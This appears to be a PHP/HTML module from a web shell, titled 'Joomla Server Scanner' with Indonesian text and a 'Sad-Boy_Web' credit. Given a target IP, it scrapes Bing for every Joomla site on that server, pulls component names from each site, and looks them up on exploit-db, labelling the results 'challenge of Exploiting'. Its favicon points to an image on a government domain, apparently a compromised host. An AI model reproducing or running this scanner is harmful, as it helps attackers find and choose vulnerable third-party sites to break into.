 <form action="?y=<?php echo $pwd; ?>&x=jss" method="post">
    <?php
	echo '
<FONT SIZE=4>Joomla Server Scanner</FONT><center>
<FONT SIZE=3>Fungsi:Melakukan Scan Server Pada Website Yang Cms Joomla</FONT><center>
<br><br><br><p align="center"><b><font size="3">Enter Targeting IP</font></b></p><br>
<form method="POST">
        <p align="center"><input type="text" class="inputz" name="site" size="65"><input class="inputzbut" type="submit" value="Scan"></p>
</form><center>

';
@set_time_limit(0);
@error_reporting(E_ALL | E_NOTICE);
 
function check_exploit($comxx){
 
$link ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
 
$result = @file_get_contents($link);
 
if (eregi("No results",$result))  {
 
echo"<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>";
 
}else{
 
echo"<td><a href='$link'>Found</a></td><td><=</td></tr>";
 
}
}
 
function check_com($url){
 
$source = @file_get_contents($url);
 
preg_match_all('{option,(.*?)/}i',$source,$f);
preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
preg_match_all('{/components/(.*?)/}i',$source,$f3);
 
$arz=array_merge($f2[1],$f[1],$f3[1]);
 
$coms=array();
 
foreach(array_unique($arz) as $x){
$coms[]=$x;
}
 
foreach($coms as $comm){
 
echo "<tr><td>$comm</td>";
check_exploit($comm);
}
 
}
 
function sec($site){
preg_match_all('{http://(.*?)(/index.php)}siU',$site, $sites);
if(eregi("www",$sites[0][0])){
return $site=str_replace("index.php","",$sites[0][0]);
}else{
return $site=str_replace("http://","http://www.",str_replace("index.php","",$sites[0][0]));
}}
 
$npages = 50000;
 
if ($_POST)
{
  $ip = trim(strip_tags($_POST['site']));
  $npage = 1;
  $allLinks = array();
 
 
   while($npage <= $npages)
  {
 
  $x=@file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);
 
 
        if ($x)
        {
                preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>siU', $x, $findlink);
              
                foreach ($findlink[1] as $fl)
              
                $allLinks[]=sec($fl);
              
              
                $npage = $npage + 10;
              
                if (preg_match('(first=' . $npage . '&amp)siU', $x, $linksuiv) == 0)
                        break;                    
        }
      
    else
                break;
  }
 
 
$allDmns = array();
 
foreach ($allLinks as $kk => $vv){
 
$allDmns[] = $vv;
}
                      
echo'<table border="1"  width=\"80%\" align=\"center\">
<tr><td width=\"30%\"><b>Server IP&nbsp;&nbsp;&nbsp;&nbsp; : </b></td><td><b>'.$ip.'</b></td></tr>                    
<tr><td width=\"30%\"><b>Sites Found&nbsp; : </b></td><td><b>'.count(array_unique($allDmns)).'</b></td></tr>
</table>';
echo "<br><br>";
 
echo'<table border="1" width="80%" align=\"center\">';
 
foreach(array_unique($allDmns) as $h3h3){
 
echo'<tr id=new><td><b><a href='.$h3h3.'>'.$h3h3.'</a></b></td><td><b>Exploit-db</b></td><td><b>challenge of Exploiting ..!</b></td></tr>';
 
check_com($h3h3);
 
}
 
echo"</table>";
 
}
echo '<FONT SIZE=2>Copyright_2019_Sad-Boy_Web</FONT><center>'
?>
<meta charset="utf-8">
  <link rel="icon" type="image/png" href="http://pereyaslav-rda.gov.ua//images/20190623_120810.jpg">
  <title>Joomla Server Scanner</title>
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <meta content="" name="keywords">
  <meta name="description" content="Melakukan Scan Pada Web Server Joomla">   
	<center><br><Br><br>
	


